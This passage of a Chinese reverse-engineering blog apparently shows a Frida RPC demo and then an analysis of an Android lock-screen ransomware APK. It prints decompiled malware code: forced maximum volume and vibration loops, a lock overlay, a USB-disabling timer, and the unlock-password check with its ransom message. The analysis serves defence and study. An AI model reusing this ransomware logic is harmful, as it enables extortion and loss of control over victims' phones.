  sub : CallSub</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">    sub: function CallSub(a,b)&#123;</span><br><span class="line">        Java.perform(function()&#123;</span><br><span class="line">            var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">            var JavaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">            var result  &#x3D; Arith.sub(JavaString.$new(a),JavaString.$new(b))</span><br><span class="line">            console.log(a,&quot;-&quot;,b,&quot;&#x3D;&quot;,result) &#x2F;&#x2F; 最终修改为 send(a,&quot;-&quot;,b,&quot;&#x3D;&quot;,result)</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>loader.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from distutils import command</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">device &#x3D; frida.get_usb_device()</span><br><span class="line"></span><br><span class="line"># frida-server -l 0.0.0.0:1</span><br><span class="line"># device &#x3D; frida.get_devices_manager().add_remote_device(&#39;192.168.50.129:1234&#39;)</span><br><span class="line"></span><br><span class="line">process &#x3D; device.attach(&#39;com.example.junior&#39;)</span><br><span class="line"></span><br><span class="line">with open(&#39;call.js&#39;) as f:</span><br><span class="line">    jscode &#x3D; f.read()</span><br><span class="line"></span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line"></span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">for i in range(20,30):</span><br><span class="line">    for j in range(0,10):</span><br><span class="line">        script.exports.sub(str(i),str(j))</span><br></pre></td></tr></table></figure><h3 id="调用结果"><a href="#调用结果" class="headerlink" title="调用结果"></a>调用结果</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 loader.py                                                                            1 ↵</span><br><span class="line">20 - 0 &#x3D; 20</span><br><span class="line">20 - 1 &#x3D; 19</span><br><span class="line">20 - 2 &#x3D; 18</span><br><span class="line">20 - 3 &#x3D; 17</span><br><span class="line">20 - 4 &#x3D; 16</span><br><span class="line">20 - 5 &#x3D; 15</span><br><span class="line">20 - 6 &#x3D; 14</span><br><span class="line">20 - 7 &#x3D; 13</span><br><span class="line">20 - 8 &#x3D; 12</span><br><span class="line">20 - 9 &#x3D; 11</span><br><span class="line">21 - 0 &#x3D; 21</span><br><span class="line">21 - 1 &#x3D; 20</span><br><span class="line">21 - 2 &#x3D; 19</span><br><span class="line">21 - 3 &#x3D; 18</span><br><span class="line">21 - 4 &#x3D; 17</span><br><span class="line">21 - 5 &#x3D; 16</span><br><span class="line">21 - 6 &#x3D; 15</span><br><span class="line">21 - 7 &#x3D; 14</span><br></pre></td></tr></table></figure><h2 id="yry-1-0-apk"><a href="#yry-1-0-apk" class="headerlink" title="yry-1.0.apk"></a>yry-1.0.apk</h2><blockquote><p>该APK为恶意锁机勒索病毒，建议在沙箱，模拟器或者在无人情况进行学习。主要恶意行为如下</p><ul><li>背景图片和背景音乐极其不健康，音量调到最大，循环播放，且无法关闭</li><li>屏幕被锁定，无法进行任何操作</li><li>USB断开</li><li>手机持续震动，并存在自启动服务</li></ul></blockquote><p>Ps: 由于会断开USB连接,这边推荐3钟方式进行测试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.使用WIFI ADB在手机上开启远程ADB服务进行连接</span><br><span class="line">2.使用模拟器进行测试</span><br><span class="line">3.修改Smali代码，重打包   &#x2F;&#x2F;apktool编译重打包 ,keytool制作密钥库,apksigner对apk签名</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129083855272.png" alt="image-20230129083855272"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129083920125.png" alt="image-20230129083920125"></p><p>安装后使用objection连接应用，静态分析文件，并遍历services服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # android hooking list services</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne</span><br><span class="line"></span><br><span class="line">Found 1 classes</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.shimeng.qq2693533893;</span><br><span class="line"></span><br><span class="line">import android.app.Activity;</span><br><span class="line">import android.content.Intent;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line"></span><br><span class="line">&#x2F;* loaded from: classes.dex *&#x2F;</span><br><span class="line">public class MainActivity extends Activity &#123;</span><br><span class="line">    @Override &#x2F;&#x2F; android.app.Activity</span><br><span class="line">    protected void onCreate(Bundle bundle) &#123;</span><br><span class="line">        LogCatBroadcaster.start(this);</span><br><span class="line">        super.onCreate(bundle);</span><br><span class="line">        try &#123;</span><br><span class="line">            startService(new Intent(this, Class.forName(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;)));</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            throw new NoClassDefFoundError(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态分析后，我们初步确定这个App的核心方法应该在MyserviceOne服务中，但是并不确定具体是哪个函数，所以直接使用命令Hook整个类。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class com.shimeng.qq2693533893.MyServiceOne --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129084728970.png" alt="image-20230129084728970"></p><p>使用objection查看对应类的函数方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # plugin wallbreaker classdump com.shimeng.qq2693533893.MyServiceOne --fullname</span><br><span class="line"></span><br><span class="line">package com.shimeng.qq2693533893</span><br><span class="line"></span><br><span class="line">class MyServiceOne &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;* static fields *&#x2F;</span><br><span class="line">static java.lang.String KEY; &#x3D;&gt; 颜如玉QQ：2693533893</span><br><span class="line">static java.lang.String KEYIV; &#x3D;&gt; EDC9381060B95338</span><br><span class="line">static boolean hexcase; &#x3D;&gt; false</span><br><span class="line">static java.lang.String 月如意; &#x3D;&gt; 8D4FF507DCDA63C201EB8B99D4170900</span><br><span class="line">static java.lang.String 破解死全家; &#x3D;&gt; 23543dfggeelysdafaqj23ou89ZXcj@#$@#$#@KJdjklj;D..&#x2F;dSF.,</span><br><span class="line">static com.shimeng.颜如玉.颜如玉QQ2693533893 破解死妈; &#x3D;&gt; [0x200c72]: com.shimeng.颜如玉.颜如玉QQ2693533893@59ac573</span><br><span class="line">static java.lang.String 诗梦MD5; &#x3D;&gt; 9DDEB743E935CE399F1DFAF080775366</span><br><span class="line"></span><br><span class="line">&#x2F;* instance fields *&#x2F;</span><br><span class="line">int B;</span><br><span class="line">int L;</span><br><span class="line">android.os.Handler hand2;</span><br><span class="line">android.os.Handler hand3;</span><br><span class="line">java.lang.Runnable runn2;</span><br><span class="line">java.lang.Runnable runn3;</span><br><span class="line">com.shimeng.qq2693533893.FloatViewUtil util;</span><br><span class="line">android.view.View v;</span><br><span class="line">java.lang.String 坐等前往世界的尽头的小船;</span><br><span class="line">android.widget.TextView 解锁;</span><br><span class="line"></span><br><span class="line">&#x2F;* constructor methods *&#x2F;</span><br><span class="line">void MyServiceOne();</span><br><span class="line"></span><br><span class="line">&#x2F;* static methods *&#x2F;</span><br><span class="line">static java.lang.String SHA1(java.util.Map);</span><br><span class="line">static void access$1000014(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static com.shimeng.qq2693533893.FloatViewUtil access$L1000000(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static boolean access$L1000002();</span><br><span class="line">static java.lang.String access$L1000003();</span><br><span class="line">static java.lang.String access$L1000004();</span><br><span class="line">static android.os.Handler access$L1000018(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static android.os.Handler access$L1000021(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static java.lang.Runnable access$L1000023(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static void access$S1000000(com.shimeng.qq2693533893.MyServiceOne, com.shimeng.qq2693533893.FloatViewUtil);</span><br><span class="line">static void access$S1000002(boolean);</span><br><span class="line">static void access$S1000003(java.lang.String);</span><br><span class="line">static void access$S1000004(java.lang.String);</span><br><span class="line">static void access$S1000018(com.shimeng.qq2693533893.MyServiceOne, android.os.Handler);</span><br><span class="line">static void access$S1000021(com.shimeng.qq2693533893.MyServiceOne, android.os.Handler);</span><br><span class="line">static void access$S1000023(com.shimeng.qq2693533893.MyServiceOne, java.lang.Runnable);</span><br><span class="line">static java.lang.String getOrderByLexicographic(java.util.Map);</span><br><span class="line">static java.util.List getParamsName(java.util.Map);</span><br><span class="line">static java.util.List lexicographicOrder(java.util.List);</span><br><span class="line">static java.lang.String splitParams(java.util.List, java.util.Map);</span><br><span class="line">static java.lang.String 颜如玉(java.lang.String);</span><br><span class="line"></span><br><span class="line">&#x2F;* instance methods *&#x2F;</span><br><span class="line">android.os.IBinder onBind(android.content.Intent);</span><br><span class="line">void onCreate();</span><br><span class="line">void onDestroy();</span><br><span class="line">void onRequestPermissionsResult(int, java.lang.String[], I[]);</span><br><span class="line">java.lang.String smsOpera(java.lang.String);</span><br><span class="line">java.lang.String 独自走在孤独的雨中(java.lang.String);</span><br><span class="line">void 诗梦();</span><br><span class="line">void sm();</span><br><span class="line">void sm2();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现程序一直在调用<code>access$L1000018</code> ,查找该函数并查询调用情况如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.shimeng.qq2693533893.MyServiceOne.access$L1000018</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # (agent) [1s0p2cg6mvi] Called com.shimeng.qq2693533893.MyServiceOne.access$L1000018(com.shimeng.qq2693533893.MyServiceOne)</span><br><span class="line">(agent) [1s0p2cg6mvi] Backtrace:</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne.access$L1000018(Native Method)</span><br><span class="line">        com.shimeng.qq2693533893.MyServiceOne$100000007.run(MyServiceOne.java:309)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:739)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:95)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5647)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:745)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:635)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129092550240.png" alt="image-20230129092550240"></p><p>hook该内部类并打印调用栈，发现调用栈上层反复调用com.shimeng.qq2693533893.MyServiceOne.access$100000007.run</p><p>同时在JEB中查看调用链，确实是在100000007中将音量调到最大，循环播放。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129085423767.png" alt="image-20230129085423767"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class 100000007 implements Runnable &#123;</span><br><span class="line">    private final MyServiceOne this$0;</span><br><span class="line"></span><br><span class="line">    static MyServiceOne access$0(100000007 arg4) &#123;</span><br><span class="line">        return MyServiceOne.this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        MyServiceOne.this.hand2.postDelayed(this, 1800L);</span><br><span class="line">        AudioManager v1 &#x3D; (AudioManager)MyServiceOne.this.getSystemService(&quot;audio&quot;);</span><br><span class="line">        v1.setStreamVolume(3, v1.getStreamMaxVolume(3), 4);</span><br><span class="line">        v1.getStreamMaxVolume(0);</span><br><span class="line">        v1.getStreamVolume(0);</span><br><span class="line">        v1.getStreamVolume(0);</span><br><span class="line">        ((Vibrator)MyServiceOne.this.getApplication().getSystemService(&quot;vibrator&quot;)).vibrate(new long[]&#123;100L, 1500L, 100L, 1500L&#125;, -1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>一。AudioManager即音频管理器， 用于管理android系统各种音频类型 （包括系统声音，通话，铃声，音乐，闹铃）的音量设置。 还可以使用它来设置“耳机插入时”的广播接收器 （action:android.intent.action.MEDIABUTTON）。 </p><p>二。MediaPlayer用于播放音频， android api中提供了该工具， 播放过程中可以控制音频的各种状态， 具体使用比较简单。 可以从资源文件中播放，从文件系统播放，从网络播放等方式。 具体包名：android.media.AudioManager</p></blockquote><p>我们来hook该类,在循环调用该函数，调整声音大小。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # (agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.setStreamVolume(int, int, int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.setStreamVolume(int, int, int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.setStreamVolume(int, int, int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br></pre></td></tr></table></figure><p>setStreamVolume (int streamType, int index, int flags) 。</p><p>函数具体使用如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setStreamVolume (int streamType, int index, int flags)  </span><br><span class="line">第一个参数（需要调整音量的类型），可以是：</span><br><span class="line">STREAM_ALARM 警报  </span><br><span class="line">STREAM_MUSIC 音乐回放即媒体音量  </span><br><span class="line">STREAM_NOTIFICATION 窗口顶部状态栏Notification</span><br><span class="line">STREAM_RING 铃声  </span><br><span class="line">STREAM_SYSTEM 系统  </span><br><span class="line">STREAM_VOICE_CALL 通话  </span><br><span class="line">STREAM_DTMF 双音多频</span><br><span class="line"></span><br><span class="line">第二个参数就是音量的int值</span><br><span class="line"></span><br><span class="line">第三个参数是一些附加参数，常用有：</span><br><span class="line">FLAG_PLAY_SOUND 调整音量时播放声音  </span><br><span class="line">FLAG_SHOW_UI 调整时显示音量条,就是按音量键出现的那个  </span><br><span class="line">0 表示什么也没有  </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;现在只需要hook android.media.AudioManager的setStreamVolume</span><br><span class="line">&#x2F;&#x2F;将此函数中的第二个参数置0即可</span><br><span class="line">&#x2F;&#x2F;hook 代码如下：</span><br><span class="line">function hook_audio()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;Inside java perform&quot;);</span><br><span class="line">        Java.use(&quot;android.media.AudioManager&quot;).setStreamVolume.implementation &#x3D; function(int1,int2,int3)&#123;</span><br><span class="line">            var res &#x3D; this.setStreamVolume(int1,0,int3);</span><br><span class="line">            return res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p>hook Called <code>com.shimeng.qq2693533893.MyServiceOne</code>后进行点击操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.SHA1(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getOrderByLexicographic(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getParamsName(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.lexicographicOrder(java.util.List)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.splitParams(java.util.List, java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.SHA1(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getOrderByLexicographic(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getParamsName(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.lexicographicOrder(java.util.List)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.splitParams(java.util.List, java.util.Map)</span><br></pre></td></tr></table></figure><p>根据调用栈来分析对应函数,使用objection来hook <code>com.shimeng.qq2693533893.MyServiceOne.颜如玉</code> 函数，发现调用<code>com.shimeng.qq2693533893.MyServiceOne$100000002.onClick(MyServiceOne.java:192)</code> 函数，并打印出了对应的返回值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # android hooking watch class_method com.shimeng.qq2693533893.MyServiceOne.颜如玉 --dump-args --dump-backtrace --dump-return</span><br><span class="line">(agent) Attempting to watch class com.shimeng.qq2693533893.MyServiceOne and method 颜如玉.</span><br><span class="line">(agent) Hooking com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) Registering job same6urlidq. Type: watch-method for: com.shimeng.qq2693533893.MyServiceOne.颜如玉</span><br><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # (agent) [same6urlidq] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [same6urlidq] Backtrace:</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne.颜如玉(Native Method)</span><br><span class="line">        com.shimeng.qq2693533893.MyServiceOne$100000002.onClick(MyServiceOne.java:186)</span><br><span class="line">android.view.View.performClick(View.java:5204)</span><br><span class="line">android.view.View$PerformClick.run(View.java:21153)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:739)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:95)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5647)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:745)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:635)</span><br><span class="line"></span><br><span class="line">(agent) [same6urlidq] Arguments com.shimeng.qq2693533893.MyServiceOne.颜如玉(BDAFF3D900183B306F259885D923DF1C)</span><br><span class="line">(agent) [same6urlidq] Return Value: 5948146256E1A341A6486442397EE2C2FB1A832E</span><br><span class="line">(agent) [same6urlidq] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [same6urlidq] Backtrace:</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne.颜如玉(Native Method)</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne$100000002.onClick(MyServiceOne.java:192)</span><br><span class="line">android.view.View.performClick(View.java:5204)</span><br><span class="line">android.view.View$PerformClick.run(View.java:21153)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:739)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:95)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5647)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:745)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:635)</span><br><span class="line"></span><br><span class="line">(agent) [same6urlidq] Arguments com.shimeng.qq2693533893.MyServiceOne.颜如玉(123)</span><br><span class="line">(agent) [same6urlidq] Return Value: 84073A4AF62DB3D30C4BF2B31622CC0EB1FA9E70</span><br></pre></td></tr></table></figure><p>定位到该函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    100000002(EditText arg16, int arg17, TextView arg18, Button arg19, TextView arg20, TextView arg21, TextView arg22, TextView arg23, TextView arg24) &#123;</span><br><span class="line">        this.val$editText &#x3D; arg16;</span><br><span class="line">        this.val$诗梦 &#x3D; arg17;</span><br><span class="line">        this.val$lpo &#x3D; arg18;</span><br><span class="line">        this.val$button &#x3D; arg19;</span><br><span class="line">        this.val$textView2 &#x3D; arg20;</span><br><span class="line">        this.val$a00 &#x3D; arg21;</span><br><span class="line">        this.val$b00 &#x3D; arg22;</span><br><span class="line">        this.val$c00 &#x3D; arg23;</span><br><span class="line">        this.val$d00 &#x3D; arg24;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static MyServiceOne access$0(100000002 arg4) &#123;</span><br><span class="line">        return MyServiceOne.this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override  &#x2F;&#x2F; android.view.View$OnClickListener</span><br><span class="line">    public void onClick(View arg15) &#123;</span><br><span class="line">        String v2 &#x3D; this.val$editText.getText().toString();</span><br><span class="line">        if(v2.length() &gt;&#x3D; 3) &#123;</span><br><span class="line">            String v3 &#x3D; MyServiceOne.颜如玉(颜如玉QQ2693533893.getSaltMD5(&quot;&quot; + this.val$诗梦)).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">            if(v3.length() &gt; 9 &amp;&amp; v3.length() &gt; 3) &#123;</span><br><span class="line">                if(颜如玉QQ2693533893.getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9))) &#123;</span><br><span class="line">                    MyServiceOne.this.util.removeView();</span><br><span class="line">                    MyServiceOne.this.sm2();</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                --MyServiceOne.this.L;</span><br><span class="line">                ++MyServiceOne.this.B;</span><br><span class="line">                this.val$lpo.setText(&quot;很抱歉！密码错误解锁请加QQ群:437732815联系管理员购买正确的密码解锁...密码以错&quot; + MyServiceOne.this.B + &quot;次！&quot; + &quot;还剩&quot; + MyServiceOne.this.L + &quot;次输入错误密码的机会&quot;);</span><br><span class="line">                if(MyServiceOne.this.L &lt;&#x3D; 0) &#123;</span><br><span class="line">                    this.val$lpo.setText(&quot;本次输入密码错误次数累计以达10次,请重启手机后获取输入密码机会！&quot;);</span><br><span class="line">                    this.val$button.setVisibility(8);</span><br><span class="line">                    this.val$textView2.setVisibility(8);</span><br><span class="line">                    this.val$editText.setVisibility(8);</span><br><span class="line">                    this.val$a00.setVisibility(8);</span><br><span class="line">                    this.val$b00.setVisibility(8);</span><br><span class="line">                    this.val$c00.setVisibility(8);</span><br><span class="line">                    this.val$d00.setVisibility(8);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到重要逻辑部分在此处。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String v3 &#x3D; MyServiceOne.颜如玉(颜如玉QQ2693533893.getSaltMD5(&quot;&quot; + this.val$诗梦)).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">if(颜如玉QQ2693533893.getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9))) &#123;</span><br><span class="line">                        MyServiceOne.this.util.removeView();</span><br><span class="line">                        MyServiceOne.this.sm2();</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>发现主要的判断逻辑如下，如果与<code>9DDEB743E935CE399F1DFAF080775366</code>相等,则移除<code>MyServiceOne.this.util.removeView()</code>,进入<code>sm2</code>。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129102441093.png" alt="image-20230129102441093"></p><p>在sm处获取对应的识别码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void sm() &#123;</span><br><span class="line">    this.util &#x3D; new FloatViewUtil(this);</span><br><span class="line">    this.v &#x3D; LayoutInflater.from(this).inflate(0x7F030002, null);  &#x2F;&#x2F; layout:MT_Bin</span><br><span class="line">    this.util.setview(this.v);</span><br><span class="line">    this.util.createfloatview(-1, 0x500);</span><br><span class="line">    Button v3 &#x3D; (Button)this.util.byid(0x7F07000B);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v4 &#x3D; (TextView)this.util.byid(0x7F070008);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    EditText v5 &#x3D; (EditText)this.util.byid(0x7F07000A);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v6 &#x3D; (TextView)this.util.byid(0x7F07000F);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v7 &#x3D; (TextView)this.util.byid(0x7F070007);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v8 &#x3D; (TextView)this.util.byid(0x7F070009);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v9 &#x3D; (TextView)this.util.byid(0x7F07000C);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v10 &#x3D; (TextView)this.util.byid(0x7F07000D);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    int v11 &#x3D; (int)(Math.random() * 4.879400E-320);</span><br><span class="line">    v4.setText(&quot;你的识别码&#x3D;&quot; + 颜如玉QQ2693533893.get(&quot;&quot; + v11));</span><br><span class="line">    颜如玉QQ2693533893.te(&quot;sdcard&quot;);</span><br><span class="line">    USBLock v13 &#x3D; new USBLock();</span><br><span class="line">    new Timer().schedule(v13, new Date(), 1000L);</span><br><span class="line">    v3.setOnClickListener(new 100000002(this, v5, v11 ^ 0x508, v6, v3, v4, v7, v8, v9, v10));</span><br></pre></td></tr></table></figure><p><code>.get</code>方法如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String get(String arg13) &#123;</span><br><span class="line">    byte[] v1 &#x3D; arg13.getBytes();</span><br><span class="line">    StringBuilder v2 &#x3D; new StringBuilder(v1.length * 2);</span><br><span class="line">    int v3;</span><br><span class="line">    for(v3 &#x3D; 0; v3 &lt; v1.length; ++v3) &#123;</span><br><span class="line">        v2.append(((char)颜如玉QQ2693533893.hexString.charAt((v1[v3] &amp; 15) &gt;&gt; 0)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String v3_1 &#x3D; &quot;&quot;;</span><br><span class="line">    String[] v4 &#x3D; &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, 